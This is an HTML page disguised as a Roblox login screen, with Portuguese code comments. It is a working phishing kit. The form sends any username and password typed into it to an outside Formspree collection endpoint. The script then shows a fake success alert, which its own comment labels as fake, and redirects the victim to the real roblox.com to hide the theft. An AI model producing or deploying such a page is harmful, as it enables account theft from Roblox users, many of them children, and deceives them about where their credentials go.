<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox - Login</title>
    <style>
        body {
            font-family: 'Gotham', Arial, sans-serif;
            background-color: #f2f4f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            width: 300px;
            text-align: center;
        }
        h2 {
            color: #393b3d;
            margin-bottom: 20px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #e5e5e5;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #00b06f;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            margin-top: 10px;
        }
        button:hover {
            background-color: #009a60;
        }
        .footer {
            margin-top: 15px;
            font-size: 12px;
            color: #777;
        }
    </style>
</head>
<body>

<div class="login-container">
    <h2>Log In</h2>
    <form action="https://formspree.io/f/mdeeknwr" method="POST" onsubmit="handleSubmit(event)">
        <input type="text" name="username" placeholder="Username or Email" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Log In</button>
    </form>
    <div class="footer">
        <p>Don't have an account? <a href="#">Sign Up</a></p>
    </div>
</div>

<script>
    <script>
    // Esta função é chamada automaticamente quando o formulário é enviado para o Formspree
    async function handleSubmit(event) {
        event.preventDefault(); // Impede a página de recarregar imediatamente
        
        const form = event.target;
        const data = new FormData(form);
        const ajax = fetch(form.action, {
            method: form.method,
            body: data,
            headers: {
                'Accept': 'application/json'
            }
        });

        // Aguarda a resposta do Formspree
        ajax.then((response) => {
            if (response.ok) {
                // Se deu certo, mostra a mensagem falsa e redireciona
                alert("Login realizado com sucesso!");
                window.location.href = "https://www.roblox.com";
            } else {
                response.json().then(data => {
                    if (Object.hasOwn(data, 'errors')) {
                        alert(data["errors"].map(error => error["message"]).join(", "));
                    } else {
                        alert("Houve um problema. Tente novamente.");
                    }
                })
            }
        }).catch((error) => {
            alert("Houve um problema. Tente novamente.");
        });
    }
</script>
</script>

</body>
</html>
